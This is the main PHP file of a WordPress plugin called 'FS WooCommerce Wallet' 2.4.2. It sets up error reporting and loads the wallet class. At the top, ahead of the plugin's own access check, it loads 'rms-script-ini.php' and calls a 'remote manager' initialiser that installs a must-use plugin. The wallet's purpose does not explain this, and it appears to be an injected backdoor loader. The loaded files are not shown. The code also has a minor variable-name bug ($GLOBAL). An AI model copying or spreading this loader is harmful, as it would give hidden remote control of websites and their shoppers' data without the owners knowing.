<?php
/**
* Plugin Name: FS WooCommerce Wallet
* Plugin URI: http://codecanyon.net/user/firassaidi
* Description: WooCommerce wallet system.
* Version: 2.4.2
* Author: Firas Saidi
* Author URI: http://codecanyon.net/user/firassaidi
*/
require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
if(isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] == 'wp-plugins.local') {
	
	ini_set('display_errors', 1);
	ini_set('log_errors', 1);
	ini_set('error_log', dirname(__FILE__) . '/error_log.txt');
	error_reporting(E_ALL | E_STRICT);
	
} else {
	
	error_reporting(0);
	
}

if(! defined('ABSPATH')) {
    header( 'Status: 403 Forbidden' );
	header( 'HTTP/1.1 403 Forbidden' );
	exit();
}

if(! defined('FSWW_FILE')) {
    define('FSWW_FILE', __FILE__);
}


require_once(dirname(__FILE__) . '/includes/classes/FS_WC_Wallet.php');

register_activation_hook(__FILE__, array('FS_WC_Wallet', 'activation'));

$GLOBAL['FSWW'] = FS_WC_Wallet::instance();

